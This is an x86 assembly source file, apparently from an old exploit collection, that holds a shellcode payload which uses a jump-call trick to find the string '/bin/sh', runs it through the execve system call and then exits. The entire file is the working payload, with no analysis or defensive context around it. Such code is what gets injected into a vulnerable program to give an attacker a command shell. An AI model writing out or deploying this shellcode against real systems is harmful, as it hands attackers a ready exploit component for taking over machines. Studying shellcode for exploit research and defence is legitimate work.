; lame execve() shell / spoty
section .text

global _start

_start:
jmp short L1
L0:
      mov ebx,[esp]	   ;get /bin/sh
      xor edx,edx
      push dword edx	   ;here we need argv[0]
      push dword ebx
      push dword edx	   ;push dword 0
      push esp
      push dword ebx	   ;/bin/sh
      mov al,59	   ;#define SYS_execve      59
      push eax

      int 0x80

      push dword edx	   ;push dword 0
      push dword ebx	   ;/bin/sh
      xor eax,eax
      inc eax		   ;mov eax,1
      push eax
      int 0x80

L1:
      call L0
      shell db "/bin/sh",0x0
      arg   db "-i",0x0
